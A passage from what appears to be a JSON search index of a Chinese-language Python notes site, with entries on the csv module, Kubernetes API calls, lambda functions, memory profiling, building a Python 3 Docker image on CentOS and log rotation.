Hello, World!","title":"\u547d\u4ee4\u884c"},{"location":"programming_language/python/csv/","text":"Python csv\u6a21\u5757 Python csv\u6a21\u5757\u4f7f\u7528\u65b9\u6cd5\u4ee3\u7801\u5b9e\u4f8b\uff0c\u590d\u5236\u7c98\u8d34\u8fd0\u884c\u5373\u53ef import csv def writeDict1(): headers = ['ID', 'NAME', 'Age', 'Height'] # \u8868\u683c\u5185\u5bb9 rows = [('1', 'LiLi', 18, 165), ('2', 'Jack', 20, 170), ('3', 'Marry', 21, 168)] with open('test1.csv', 'w', encoding='utf_8_sig') as csvfile: spamwriter = csv.writer(csvfile) spamwriter.writerow(headers) spamwriter.writerows(rows) def writeDict2(): with open('test2.csv', 'w') as csvfile: # \u521b\u5efa\u5b57\u6bb5\u540d fieldnames = ['first_name', 'last_time'] # \u521b\u5efa\u5b57\u6bb5\u5199\u5165\u5bf9\u8c61 writer = csv.DictWriter(csvfile, fieldnames=fieldnames) writer.writeheader() # \u5199\u5165\u8868\u683c\u5185\u5bb9 writer.writerow({'first_name': 'Baked', 'last_time': 'Beans'}) writer.writerow({'first_name': 'Baked', 'last_time': 'Beans'}) writer.writerow({'first_name': 'Baked', 'last_time': 'Beans'}) def readDict1(): with open(\"test1.csv\", 'r', encoding='utf_8_sig') as f: f_csv = csv.reader(f) for row in f_csv: print(row) def readDict2(): with open('test2.csv', 'r') as csvfile: # \u8bfb\u53d6\u6587\u4ef6 reader = csv.DictReader(csvfile) # \u904d\u5386\u8f93\u5165\u6307\u5b9a\u5b57\u6bb5\u7684\u5185\u5bb9 for row in reader: print(row['first_name'], row['last_time']) if __name__ == '__main__': writeDict1() writeDict2() readDict1() readDict2() import csv with open('data.csv','w+',encoding='utf-8',newline='') as csvfile: writer = csv.writer(csvfile) # \u5199\u5165\u4e00\u884c writer.writerow(['1', '2', '3', '4', '5', '5', '6'])","title":"CSV\u6a21\u5757"},{"location":"programming_language/python/csv/#python-csv","text":"Python csv\u6a21\u5757\u4f7f\u7528\u65b9\u6cd5\u4ee3\u7801\u5b9e\u4f8b\uff0c\u590d\u5236\u7c98\u8d34\u8fd0\u884c\u5373\u53ef import csv def writeDict1(): headers = ['ID', 'NAME', 'Age', 'Height'] # \u8868\u683c\u5185\u5bb9 rows = [('1', 'LiLi', 18, 165), ('2', 'Jack', 20, 170), ('3', 'Marry', 21, 168)] with open('test1.csv', 'w', encoding='utf_8_sig') as csvfile: spamwriter = csv.writer(csvfile) spamwriter.writerow(headers) spamwriter.writerows(rows) def writeDict2(): with open('test2.csv', 'w') as csvfile: # \u521b\u5efa\u5b57\u6bb5\u540d fieldnames = ['first_name', 'last_time'] # \u521b\u5efa\u5b57\u6bb5\u5199\u5165\u5bf9\u8c61 writer = csv.DictWriter(csvfile, fieldnames=fieldnames) writer.writeheader() # \u5199\u5165\u8868\u683c\u5185\u5bb9 writer.writerow({'first_name': 'Baked', 'last_time': 'Beans'}) writer.writerow({'first_name': 'Baked', 'last_time': 'Beans'}) writer.writerow({'first_name': 'Baked', 'last_time': 'Beans'}) def readDict1(): with open(\"test1.csv\", 'r', encoding='utf_8_sig') as f: f_csv = csv.reader(f) for row in f_csv: print(row) def readDict2(): with open('test2.csv', 'r') as csvfile: # \u8bfb\u53d6\u6587\u4ef6 reader = csv.DictReader(csvfile) # \u904d\u5386\u8f93\u5165\u6307\u5b9a\u5b57\u6bb5\u7684\u5185\u5bb9 for row in reader: print(row['first_name'], row['last_time']) if __name__ == '__main__': writeDict1() writeDict2() readDict1() readDict2() import csv with open('data.csv','w+',encoding='utf-8',newline='') as csvfile: writer = csv.writer(csvfile) # \u5199\u5165\u4e00\u884c writer.writerow(['1', '2', '3', '4', '5', '5', '6'])","title":"Python csv\u6a21\u5757"},{"location":"programming_language/python/csv_row_to_col/","text":"CSV\u6587\u4ef6\u4e2d\uff0c\u884c\u53d8\u5217\uff0c\u5217\u53d8\u884c\u8f6c\u6362 import csv # \u628aCSV\u4e2d\u884c\u53d8\u6210\u5217\uff0c\u5217\u53d8\u6210\u884c\uff0c\u8f93\u5165csv\u6587\u4ef6\uff0c\u6bcf\u884c\u7684\u5217\u6570\u5fc5\u987b\u4e00\u81f4 def row_to_col(input_csv_name, output_csv_name): with open(input_csv_name, 'r', encoding='utf_8_sig') as f: f_csv = csv.reader(f) # csv_list \u7528\u6765\u5b58\u50a8\u8f93\u5165csv\u4e2d\u7684\u6570\u636e csv_list = [] for row in f_csv: csv_list.append(row) # \u6839\u636e\u7b2c\u4e00\u884c\uff0c\u6709\u591a\u5c11\u5217\uff0c\u5c31\u751f\u6210\u591a\u5c11\u4e2alist,list\u7684\u540d\u5b57\u4e3arow1,row2,row3... # counter_1\uff0ccounter_2\uff0ccounter_3\uff0c\u8ba1\u6570\u5668 first_line = csv_list[0] counter_1 = 0 for i in first_line: counter_1 = counter_1 + 1 locals()['row' + str(counter_1)] = [] # \u5f80row1,row2,row3...\u7b49 list\u4e2d\u586b\u6570 # \u904d\u5386\u884c for row_list in csv_list: counter_2 = 0 # \u904d\u5386\u5217\uff0c\u7b2c\u4e00\u5217\u5b58\u5165row1,\u7b2c\u4e8c\u5217\u5b58\u5165row2\uff0c\u7b2c\u4e09\u5217\u5b58\u5165row3...,\u4ee5\u6b64\u7c7b\u63a8 for i in row_list: counter_2 = counter_2 + 1 locals()['row' + str(counter_2)].append(i) # \u5199\u5165\u6570\u636e with open(output_csv_name, 'w+', encoding='utf-8', newline='') as csvfile: writer = csv.writer(csvfile) counter_3 = 0 for i in first_line: counter_3 = counter_3 + 1 # \u4e00\u4e2alist\u4e3a\u4e00\u884c writer.writerow(locals()['row' + str(counter_3)]) if __name__ == '__main__': row_to_col(\"input.csv\", 'output.csv')","title":"CSV\u3001\u5217\u53d8\u884c\u3001\u884c\u53d8\u5217\u8f6c\u6362"},{"location":"programming_language/python/csv_row_to_col/#csv","text":"import csv # \u628aCSV\u4e2d\u884c\u53d8\u6210\u5217\uff0c\u5217\u53d8\u6210\u884c\uff0c\u8f93\u5165csv\u6587\u4ef6\uff0c\u6bcf\u884c\u7684\u5217\u6570\u5fc5\u987b\u4e00\u81f4 def row_to_col(input_csv_name, output_csv_name): with open(input_csv_name, 'r', encoding='utf_8_sig') as f: f_csv = csv.reader(f) # csv_list \u7528\u6765\u5b58\u50a8\u8f93\u5165csv\u4e2d\u7684\u6570\u636e csv_list = [] for row in f_csv: csv_list.append(row) # \u6839\u636e\u7b2c\u4e00\u884c\uff0c\u6709\u591a\u5c11\u5217\uff0c\u5c31\u751f\u6210\u591a\u5c11\u4e2alist,list\u7684\u540d\u5b57\u4e3arow1,row2,row3... # counter_1\uff0ccounter_2\uff0ccounter_3\uff0c\u8ba1\u6570\u5668 first_line = csv_list[0] counter_1 = 0 for i in first_line: counter_1 = counter_1 + 1 locals()['row' + str(counter_1)] = [] # \u5f80row1,row2,row3...\u7b49 list\u4e2d\u586b\u6570 # \u904d\u5386\u884c for row_list in csv_list: counter_2 = 0 # \u904d\u5386\u5217\uff0c\u7b2c\u4e00\u5217\u5b58\u5165row1,\u7b2c\u4e8c\u5217\u5b58\u5165row2\uff0c\u7b2c\u4e09\u5217\u5b58\u5165row3...,\u4ee5\u6b64\u7c7b\u63a8 for i in row_list: counter_2 = counter_2 + 1 locals()['row' + str(counter_2)].append(i) # \u5199\u5165\u6570\u636e with open(output_csv_name, 'w+', encoding='utf-8', newline='') as csvfile: writer = csv.writer(csvfile) counter_3 = 0 for i in first_line: counter_3 = counter_3 + 1 # \u4e00\u4e2alist\u4e3a\u4e00\u884c writer.writerow(locals()['row' + str(counter_3)]) if __name__ == '__main__': row_to_col(\"input.csv\", 'output.csv')","title":"CSV\u6587\u4ef6\u4e2d\uff0c\u884c\u53d8\u5217\uff0c\u5217\u53d8\u884c\u8f6c\u6362"},{"location":"programming_language/python/k8s/","text":"Python \u4f7f\u7528K8S API from kubernetes import client, config config_file = r\"config\" config.kube_config.load_kube_config(config_file=config_file) # \u83b7\u53d6K8S \u6838\u5fc3API\u63a5\u53e3 Api_Instance = client.CoreV1Api() # \u83b7\u53d6K8S APP APIJ\u63a5\u53e3 apps_api = client.AppsV1Api() print(apps_api.list_deployment_for_all_namespaces()) \u83b7\u53d6\u6240\u6709\u7684deployment\u8be6\u60c5 config\u6587\u4ef6\u4e3aK8S\u94fe\u63a5\u6587\u4ef6config \u5b98\u65b9\u5730\u5740\uff1a https://github.com/kubernetes-client/python from kubernetes import client, config import json config_file = r\"config\" config.kube_config.load_kube_config(config_file=config_file) v1 = client.CoreV1Api() print(\"Listing pods with their IPs:\") ret = v1.list_pod_for_all_namespaces(watch=False) for i in ret.items: print(\"%s\\t%s\\t%s\" % (i.status.pod_ip, i.metadata.namespace, i.metadata.name))","title":"K8S\u6a21\u5757"},{"location":"programming_language/python/lambda%E5%87%BD%E6%95%B0/","text":"ambda\u51fd\u6570 Python\u4e2d\u6709\u4e24\u79cd\u5b9a\u4e49\u51fd\u6570\u7684\u65b9\u5f0f\uff0c\u4e00\u79cd\u662f\u7528\u5173\u952e\u5b57def\u8fdb\u884c\u5b9a\u4e49\u3002\u4f7f\u7528\u8fd9\u79cd\u65b9\u5f0f\u5b9a\u4e49\u51fd\u6570\u65f6\u9700\u8981\u6307\u5b9a\u51fd\u6570\u7684\u540d\u79f0\uff0c\u8fd9\u7c7b\u51fd\u6570\u88ab\u79f0\u4e3a\u666e\u901a\u51fd\u6570\uff1b\u53e6\u5916\u4e00\u79cd\u662f\u7528\u5173\u952e\u5b57lambda\u8fdb\u884c\u5b9a\u4e49\uff0c\u4e0d\u9700\u8981\u6307\u5b9a\u51fd\u6570\u7684\u540d\u5b57\uff0c\u8fd9\u7c7b\u51fd\u6570\u88ab\u79f0\u4e3alambda\u51fd\u6570\u3002lambda\u51fd\u6570\u53c8\u79f0\u4e3a\u533f\u540d\u51fd\u6570\uff0c\u5b83\u662f\u4e00\u79cd\u5355\u884c\u7684\u5c0f\u51fd\u6570\uff0c\u8bed\u6cd5\u7b80\u5355\uff0c \u7b80\u5316\u4ee3\u7801\uff0c\u4e0d\u4f1a\u4ea7\u751f\u547d\u540d\u51b2\u7a81\uff0c\u4e5f\u4e0d\u4f1a\u5360\u7528\u547d\u540d\u7a7a\u95f4\u3002lambda\u51fd\u6570\u662f\u4e00\u4e2a\u53ef\u4ee5\u63a5\u6536\u4efb\u610f\u591a\u4e2a\u53c2\u6570\uff08\u5305\u62ec\u53ef\u9009\u53c2\u6570\uff09\u5e76\u4e14\u8fd4\u56de\u5355\u4e2a\u8868\u8fbe\u5f0f\u503c\u7684\u51fd\u6570\u3002lambda\u51fd\u6570\u8fd4\u56de\u7684\u8868\u8fbe\u5f0f\u4e0d\u80fd\u8d85\u8fc7\u4e00\u4e2a\u3002\u4e0d\u8981\u8bd5\u56fe\u4f7f\u7528lambda\u51fd\u6570\u6765\u5b9e\u73b0\u590d\u6742\u7684\u4e1a\u52a1\u903b\u8f91\u529f\u80fd\uff0c\u56e0\u4e3a\u8fd9\u4f1a\u4f7f\u4ee3\u7801\u53d8\u5f97\u6666\u6da9\u96be\u61c2\u3002 Lambda \u51fd\u6570\u7684\u8bed\u6cd5\uff1a lambda \u53c2\u6570:\u8868\u8fbe\u5f0f \u5176\u4e2d\uff0c\u53c2\u6570\u53ef\u4ee5\u6709\u591a\u4e2a\uff0c\u7528\u9017\u53f7\u9694\u5f00\uff1b\u5192\u53f7\u53f3\u8fb9\u7684\u8868\u8fbe\u5f0f\u53ea\u80fd\u6709\u4e00\u4e2a\uff0c\u5e76\u4e14lambda\u51fd\u6570\u8fd4\u56de\u7684\u662f\u51fd\u6570\u5bf9\u8c61\uff0c\u6240\u4ee5\uff0c\u4f7f\u7528lambda\u51fd\u6570\u65f6\uff0c\u9700\u8981\u5b9a\u4e49\u4e00\u4e2a\u53d8\u91cf\u53bb\u63a5\u6536\u3002 Lamda\u51fd\u6570\u7684\u4e00\u4e2a\u793a\u4f8b\uff1a sum = lambda x,y : x + y print(sum(12,123)) \u7ed3\u679c\uff1a 135 \u518d\u4f8b\uff1a g = lambda x, y=0, z=0: x+y+z g(1) g(3,4,7) \u7ed3\u679c\uff1a 1 14","title":"lambda\u51fd\u6570"},{"location":"programming_language/python/lambda%E5%87%BD%E6%95%B0/#ambda","text":"Python\u4e2d\u6709\u4e24\u79cd\u5b9a\u4e49\u51fd\u6570\u7684\u65b9\u5f0f\uff0c\u4e00\u79cd\u662f\u7528\u5173\u952e\u5b57def\u8fdb\u884c\u5b9a\u4e49\u3002\u4f7f\u7528\u8fd9\u79cd\u65b9\u5f0f\u5b9a\u4e49\u51fd\u6570\u65f6\u9700\u8981\u6307\u5b9a\u51fd\u6570\u7684\u540d\u79f0\uff0c\u8fd9\u7c7b\u51fd\u6570\u88ab\u79f0\u4e3a\u666e\u901a\u51fd\u6570\uff1b\u53e6\u5916\u4e00\u79cd\u662f\u7528\u5173\u952e\u5b57lambda\u8fdb\u884c\u5b9a\u4e49\uff0c\u4e0d\u9700\u8981\u6307\u5b9a\u51fd\u6570\u7684\u540d\u5b57\uff0c\u8fd9\u7c7b\u51fd\u6570\u88ab\u79f0\u4e3alambda\u51fd\u6570\u3002lambda\u51fd\u6570\u53c8\u79f0\u4e3a\u533f\u540d\u51fd\u6570\uff0c\u5b83\u662f\u4e00\u79cd\u5355\u884c\u7684\u5c0f\u51fd\u6570\uff0c\u8bed\u6cd5\u7b80\u5355\uff0c \u7b80\u5316\u4ee3\u7801\uff0c\u4e0d\u4f1a\u4ea7\u751f\u547d\u540d\u51b2\u7a81\uff0c\u4e5f\u4e0d\u4f1a\u5360\u7528\u547d\u540d\u7a7a\u95f4\u3002lambda\u51fd\u6570\u662f\u4e00\u4e2a\u53ef\u4ee5\u63a5\u6536\u4efb\u610f\u591a\u4e2a\u53c2\u6570\uff08\u5305\u62ec\u53ef\u9009\u53c2\u6570\uff09\u5e76\u4e14\u8fd4\u56de\u5355\u4e2a\u8868\u8fbe\u5f0f\u503c\u7684\u51fd\u6570\u3002lambda\u51fd\u6570\u8fd4\u56de\u7684\u8868\u8fbe\u5f0f\u4e0d\u80fd\u8d85\u8fc7\u4e00\u4e2a\u3002\u4e0d\u8981\u8bd5\u56fe\u4f7f\u7528lambda\u51fd\u6570\u6765\u5b9e\u73b0\u590d\u6742\u7684\u4e1a\u52a1\u903b\u8f91\u529f\u80fd\uff0c\u56e0\u4e3a\u8fd9\u4f1a\u4f7f\u4ee3\u7801\u53d8\u5f97\u6666\u6da9\u96be\u61c2\u3002 Lambda \u51fd\u6570\u7684\u8bed\u6cd5\uff1a lambda \u53c2\u6570:\u8868\u8fbe\u5f0f \u5176\u4e2d\uff0c\u53c2\u6570\u53ef\u4ee5\u6709\u591a\u4e2a\uff0c\u7528\u9017\u53f7\u9694\u5f00\uff1b\u5192\u53f7\u53f3\u8fb9\u7684\u8868\u8fbe\u5f0f\u53ea\u80fd\u6709\u4e00\u4e2a\uff0c\u5e76\u4e14lambda\u51fd\u6570\u8fd4\u56de\u7684\u662f\u51fd\u6570\u5bf9\u8c61\uff0c\u6240\u4ee5\uff0c\u4f7f\u7528lambda\u51fd\u6570\u65f6\uff0c\u9700\u8981\u5b9a\u4e49\u4e00\u4e2a\u53d8\u91cf\u53bb\u63a5\u6536\u3002 Lamda\u51fd\u6570\u7684\u4e00\u4e2a\u793a\u4f8b\uff1a sum = lambda x,y : x + y print(sum(12,123)) \u7ed3\u679c\uff1a 135 \u518d\u4f8b\uff1a g = lambda x, y=0, z=0: x+y+z g(1) g(3,4,7) \u7ed3\u679c\uff1a 1 14","title":"ambda\u51fd\u6570"},{"location":"programming_language/python/mem/","text":"Python \u5185\u5b58\u5206\u6790 \u9879\u76ee\u5730\u5740\uff1ahttps://github.com/pythonprofilers/memory_profiler \u793a\u4f8b\u4ee3\u7801 from memory_profiler import profile @profile def my_func(): print(\"hello\") if __name__ == '__main__': my_func() \u8fd0\u884c\u7ed3\u679c hello Filename: D:\\idea\\one\\test\\mem.py Line # Mem usage Increment Occurences Line Contents ============================================================ 4 26.6 MiB 26.6 MiB 1 @profile 5 def my_func(): 6 26.6 MiB 0.0 MiB 1 print(\"hello\") \u5185\u5b58\u5360\u7528\u4e00\u76ee\u4e86\u7136 \u8be5\u6a21\u5757\u8fd8\u63d0\u4f9b\u4e86\u547d\u4ee4\u884c\u6027\u80fd\u5de5\u5177 mprof (venv) D:\\idea\\one\\test>mprof run mem.py mprof: Sampling memory every 0.1s running new process running as a Python program... hello Filename: mem.py Line # Mem usage Increment Occurences Line Contents ============================================================ 4 27.3 MiB 27.3 MiB 1 @profile 5 def my_func(): 6 27.3 MiB 0.0 MiB 1 print(\"hello\")","title":"\u5185\u5b58\u6027\u80fd\u6a21\u5757"},{"location":"programming_language/python/mem/#python","text":"\u9879\u76ee\u5730\u5740\uff1ahttps://github.com/pythonprofilers/memory_profiler \u793a\u4f8b\u4ee3\u7801 from memory_profiler import profile @profile def my_func(): print(\"hello\") if __name__ == '__main__': my_func() \u8fd0\u884c\u7ed3\u679c hello Filename: D:\\idea\\one\\test\\mem.py Line # Mem usage Increment Occurences Line Contents ============================================================ 4 26.6 MiB 26.6 MiB 1 @profile 5 def my_func(): 6 26.6 MiB 0.0 MiB 1 print(\"hello\") \u5185\u5b58\u5360\u7528\u4e00\u76ee\u4e86\u7136 \u8be5\u6a21\u5757\u8fd8\u63d0\u4f9b\u4e86\u547d\u4ee4\u884c\u6027\u80fd\u5de5\u5177 mprof (venv) D:\\idea\\one\\test>mprof run mem.py mprof: Sampling memory every 0.1s running new process running as a Python program... hello Filename: mem.py Line # Mem usage Increment Occurences Line Contents ============================================================ 4 27.3 MiB 27.3 MiB 1 @profile 5 def my_func(): 6 27.3 MiB 0.0 MiB 1 print(\"hello\")","title":"Python \u5185\u5b58\u5206\u6790"},{"location":"programming_language/python/python3_docker/","text":"Python3\u7684Docker\u955c\u50cf\u5236\u4f5c \u7f16\u8f91 Dockerfile \u6587\u4ef6 FROM docker.io/library/centos:7.4.1708 #python3\u57fa\u7840\u955c\u50cf\u6784\u5efa MAINTAINER yinzhipeng WORKDIR /usr/local RUN yum install -y https://repo.ius.io/ius-release-el7.rpm https://dl.fedoraproject.org/pub/epel/epel-release-latest-7.noarch.rpm RUN curl -o /etc/yum.repos.d/CentOS-Base.repo https://mirrors.aliyun.com/repo/Centos-7.repo && curl -o /etc/yum.repos.d/epel.repo http://mirrors.aliyun.com/repo/epel-7.repo && yum makecache fast RUN yum install -y wget git222 vim net-tools gcc zlib-devel bzip2-devel openssl-devel ncurses-devel sqlite-devel readline-devel tk-devel libffi-devel make RUN wget https://mirrors.huaweicloud.com/python/3.9.6/Python-3.9.6.tgz RUN tar -zxvf Python-3.9.6.tgz WORKDIR /usr/local/Python-3.9.6 RUN ./configure --prefix=/usr/local/python/python3 && make && make install RUN ln -s /usr/local/python/python3/bin/python3 /usr/bin/python3 RUN ln -s /usr/local/python/python3/bin/pip3 /usr/bin/pip3 WORKDIR /app CMD bash -c \"while true;do sleep 1s;done\" \u7136\u540e\u6267\u884c docker build -t='self_Python3' .","title":"Python3 Dokcer\u955c\u50cf\u5236\u4f5c"},{"location":"programming_language/python/python3_docker/#python3docker","text":"\u7f16\u8f91 Dockerfile \u6587\u4ef6 FROM docker.io/library/centos:7.4.1708 #python3\u57fa\u7840\u955c\u50cf\u6784\u5efa MAINTAINER yinzhipeng WORKDIR /usr/local RUN yum install -y https://repo.ius.io/ius-release-el7.rpm https://dl.fedoraproject.org/pub/epel/epel-release-latest-7.noarch.rpm RUN curl -o /etc/yum.repos.d/CentOS-Base.repo https://mirrors.aliyun.com/repo/Centos-7.repo && curl -o /etc/yum.repos.d/epel.repo http://mirrors.aliyun.com/repo/epel-7.repo && yum makecache fast RUN yum install -y wget git222 vim net-tools gcc zlib-devel bzip2-devel openssl-devel ncurses-devel sqlite-devel readline-devel tk-devel libffi-devel make RUN wget https://mirrors.huaweicloud.com/python/3.9.6/Python-3.9.6.tgz RUN tar -zxvf Python-3.9.6.tgz WORKDIR /usr/local/Python-3.9.6 RUN ./configure --prefix=/usr/local/python/python3 && make && make install RUN ln -s /usr/local/python/python3/bin/python3 /usr/bin/python3 RUN ln -s /usr/local/python/python3/bin/pip3 /usr/bin/pip3 WORKDIR /app CMD bash -c \"while true;do sleep 1s;done\" \u7136\u540e\u6267\u884c docker build -t='self_Python3' .","title":"Python3\u7684Docker\u955c\u50cf\u5236\u4f5c"},{"location":"programming_language/python/python3_env/","text":"Centos7\u5b89\u88c5Python3\uff0c\u4e0d\u5f71\u54cdpython2 \u4e0b\u8f7dpython3\u5b89\u88c5\u5305\uff1ahttps://www.python.org/ftp/python/3.9.7/Python-3.9.7.tgz [root@graphical ~]# cat install_python3.sh yum install -y https://repo.ius.io/ius-release-el7.rpm https://dl.fedoraproject.org/pub/epel/epel-release-latest-7.noarch.rpm curl -o /etc/yum.repos.d/CentOS-Base.repo https://mirrors.aliyun.com/repo/Centos-7.repo && curl -o /etc/yum.repos.d/epel.repo http://mirrors.aliyun.com/repo/epel-7.repo && yum makecache fast yum install -y wget git222 vim net-tools gcc zlib-devel bzip2-devel openssl-devel ncurses-devel sqlite-devel readline-devel tk-devel libffi-devel make wget https://mirrors.huaweicloud.com/python/3.9.6/Python-3.9.6.tgz tar -zxvf Python-3.9.6.tgz cd Python-3.9.6 mkdir -p /usr/local/python/python3 ./configure --prefix=/usr/local/python/python3 && make && make install ln -s /usr/local/python/python3/bin/python3 /usr/bin/python3 ln -s /usr/local/python/python3/bin/pip3 /usr/bin/pip3 \u6dfb\u52a0\u73af\u5883\u53d8\u91cf\uff0c\u672b\u5c3e\u5bfc\u5165\u4e24\u884c,\u5b89\u88c5\u7b2c\u4e09\u65b9\u5305\u6709\u7684\u65f6\u5019\u4f1a\u5728/usr/local/python/python3/bin\u751f\u6210\u4e8c\u8fdb\u5236\u6587\u4ef6 [root@graphical ~]# cat /etc/profile export PYTHON3_HOME=/usr/local/python/python3 export PATH=$PATH:$PYTHON3_HOME/bin [root@graphical ~]# source /etc/profile [root@graphical ~]# python --version Python 2.7.5 [root@graphical ~]# python3 --version Python 3.9.6 [root@graphical ~]#","title":"Centos7\u5b89\u88c5Python3"},{"location":"programming_language/python/python3_env/#centos7python3python2","text":"\u4e0b\u8f7dpython3\u5b89\u88c5\u5305\uff1ahttps://www.python.org/ftp/python/3.9.7/Python-3.9.7.tgz [root@graphical ~]# cat install_python3.sh yum install -y https://repo.ius.io/ius-release-el7.rpm https://dl.fedoraproject.org/pub/epel/epel-release-latest-7.noarch.rpm curl -o /etc/yum.repos.d/CentOS-Base.repo https://mirrors.aliyun.com/repo/Centos-7.repo && curl -o /etc/yum.repos.d/epel.repo http://mirrors.aliyun.com/repo/epel-7.repo && yum makecache fast yum install -y wget git222 vim net-tools gcc zlib-devel bzip2-devel openssl-devel ncurses-devel sqlite-devel readline-devel tk-devel libffi-devel make wget https://mirrors.huaweicloud.com/python/3.9.6/Python-3.9.6.tgz tar -zxvf Python-3.9.6.tgz cd Python-3.9.6 mkdir -p /usr/local/python/python3 ./configure --prefix=/usr/local/python/python3 && make && make install ln -s /usr/local/python/python3/bin/python3 /usr/bin/python3 ln -s /usr/local/python/python3/bin/pip3 /usr/bin/pip3 \u6dfb\u52a0\u73af\u5883\u53d8\u91cf\uff0c\u672b\u5c3e\u5bfc\u5165\u4e24\u884c,\u5b89\u88c5\u7b2c\u4e09\u65b9\u5305\u6709\u7684\u65f6\u5019\u4f1a\u5728/usr/local/python/python3/bin\u751f\u6210\u4e8c\u8fdb\u5236\u6587\u4ef6 [root@graphical ~]# cat /etc/profile export PYTHON3_HOME=/usr/local/python/python3 export PATH=$PATH:$PYTHON3_HOME/bin [root@graphical ~]# source /etc/profile [root@graphical ~]# python --version Python 2.7.5 [root@graphical ~]# python3 --version Python 3.9.6 [root@graphical ~]#","title":"Centos7\u5b89\u88c5Python3\uff0c\u4e0d\u5f71\u54cdpython2"},{"location":"programming_language/python/python_log/","text":"Python\u63a7\u5236\u53f0\u8f93\u51fa\u91cd\u5b9a\u5411\u5230\u65e5\u5fd7\u5e76\u63a7\u5236\u65e5\u5fd7\u5927\u5c0f python\u63a7\u5236\u53f0\u8f93\u51fa\uff0c\u53ef\u4ee5\u8f93\u51faprint\u548c\u4e00\u4e9berror\u4fe1\u606f\u3002\u90a3\u4e48\u542f\u52a8python\u7684\u65f6\u5019\u53ef\u4ee5\u91cd\u5b9a\u5411\u63a7\u5236\u53f0\u7684\u8f93\u51fa\u4fe1\u606f\u5230\u65e5\u5fd7\u6587\u4ef6\u4e2d mkdir -p /app/example/log touch /app/example/example.py \u7f16\u8f91python\u6587\u4ef6\uff0c\u8bbe\u7f6e\u65e5\u5fd7\u6587\u4ef6\u53ca\u6700\u5927\u5927\u5c0f\u548c\u4fdd\u5b58\u4e2a\u6570\u3001\u53ca\u65e5\u5fd7\u6837\u5f0f import os import time import traceback import schedule import logging import colorlog import sys # \u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u65e5\u5fd7\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014 logfilename = \"/app/example/log/example.log\" log_colors_config = { 'DEBUG': 'white', 'INFO': 'green', 'WARNING': 'yellow', 'ERROR': 'red', 'CRITICAL': 'bold_red', } logger = logging.getLogger(__name__) logger.setLevel(level=logging.DEBUG) # \u8bbe\u7f6e\u65e5\u5fd7\u6587\u4ef6\u5927\u5c0f handler = logging.handlers.RotatingFileHandler(logfilename, encoding='utf-8', maxBytes=100 * 1024 * 1024, backupCount=10) # \u8f93\u51fa\u5230\u6587\u4ef6\u7684\u65e5\u5fd7\u7ea7\u522b handler.setLevel(logging.INFO) # \u65e5\u5fd7\u6837\u5f0f formatter = logging.Formatter( '%(asctime)s-%(name)s-%(filename)s-[line:%(lineno)d]-%(levelname)s-[\u65e5\u5fd7\u4fe1\u606f]: %(message)s') # \u63a7\u5236\u53f0\u65e5\u5fd7\u6837\u5f0f formatter_color = colorlog.ColoredFormatter( '%(log_color)s%(asctime)s-%(name)s-%(filename)s-[line:%(lineno)d]-%(levelname)s-[\u65e5\u5fd7\u4fe1\u606f]: %(message)s', log_colors=log_colors_config) # \u63a7\u5236\u53f0\u7684\u65e5\u5fd7 console = logging.StreamHandler(stream=sys.stdout) # \u63a7\u5236\u53f0\u7684\u65e5\u5fd7\u7ea7\u522b console.setLevel(logging.DEBUG) # \u8bbe\u7f6e\u65e5\u5fd7\u6837\u5f0f handler.setFormatter(formatter) # \u8bbe\u7f6e\u63a7\u5236\u53f0\u65e5\u5fd7\u6837\u5f0f console.setFormatter(formatter_color) #\u6dfb\u52a0\u8f93\u51fa logger.addHandler(handler) logger.addHandler(console) # \u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u65e5\u5fd7\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014 logger.info(\"cron start\") try: logger.info(\"dir:\" + os.getcwd()) while True: time.sleep(1) print(\"hello\") except Exception as e: logger.error(e) logger.error(traceback.print_exc()) \u5230\u6b64\uff0cexample.py\u4e2d logger.info \u548c logger.error \u65e5\u5fd7\u4f1a\u8f93\u51fa\u5230 \u65e5\u5fd7\u6587\u4ef6 \u4e2d \u548c \u63a7\u5236\u53f0 \u4e0a\uff0c print \u8bed\u53e5\u4f1a\u8f93\u51fa\u5230\u63a7\u5236\u53f0\u4e0a \u7528\u4e0b\u9762\u7684\u65b9\u5f0f\u542f\u52a8\uff0c\u63a7\u5236\u53f0\u7684\u8f93\u51fa\u4f1a\u90fd\u51fa\u73b0\u5728 /app/example/log/example.log \u6587\u4ef6\u4e2d \u4e00\u5f00\u59cb\u6211\u4ee5\u4e3a logger.info \u548c logger.error \u4f1a\u5728\u65e5\u5fd7\u4e2d\u51fa\u73b0\u4e24\u6b21\uff0c\u903b\u8f91\u4e0a\uff0c\u4ee3\u7801\u4e2d\u6307\u5b9a\u4e86\u4e00\u904d\u63a7\u5236\u53f0\u8f93\u51fa\uff0c\u901a\u8fc7\u547d\u4ee4\u6307\u5b9a\u4e86\u4e00\u904d\u63a7\u5236\u53f0\u8f93\u51fa\uff0c\u540e\u6765\u53d1\u73b0\u5e76\u6ca1\u6709\uff0c\u53ea\u4f1a\u5728\u65e5\u5fd7\u4e2d\u51fa\u73b0\u4e00\u6b21\u3002\u800c\u4e14\u65e5\u5fd7\u5927\u5c0f\u6b63\u5e38\u88ab\u5207\u5272 nohup python3 /app/example/example.py > /app/example/log/example.log 2>&1 &","title":"Python3 \u65e5\u5fd7\u63a7\u5236"},{"location":"programming_language/python/python_log/#python","text":"python\u63a7\u5236\u53f0\u8f93\u51fa\uff0c\u53ef\u4ee5\u8f93\u51faprint\u548c\u4e00\u4e9berror\u4fe1\u606f\u3002\u90a3\u4e48\u542f\u52a8python\u7684\u65f6\u5019\u53ef\u4ee5\u91cd\u5b9a\u5411\u63a7\u5236\u53f0\u7684\u8f93\u51fa\u4fe1\u606f\u5230\u65e5\u5fd7\u6587\u4ef6\u4e2d mkdir -p /app/example/log touch /app/example/example.py \u7f16\u8f91python\u6587\u4ef6\uff0c\u8bbe\u7f6e\u65e5\u5fd7\u6587\u4ef6\u53ca\u6700\u5927\u5927\u5c0f\u548c\u4fdd\u5b58\u4e2a\u6570\u3001\u53ca\u65e5\u5fd7\u6837\u5f0f import os import time import traceback import schedule import logging import colorlog import sys # \u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u65e5\u5fd7\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014 logfilename = \"/app/example/log/example.log\" log_colors_config = { 'DEBUG': 'white', 'INFO': 'green', 'WARNING': 'yellow', 'ERROR': 'red', 'CRITICAL': 'bold_red', } logger = logging.getLogger(__name__) 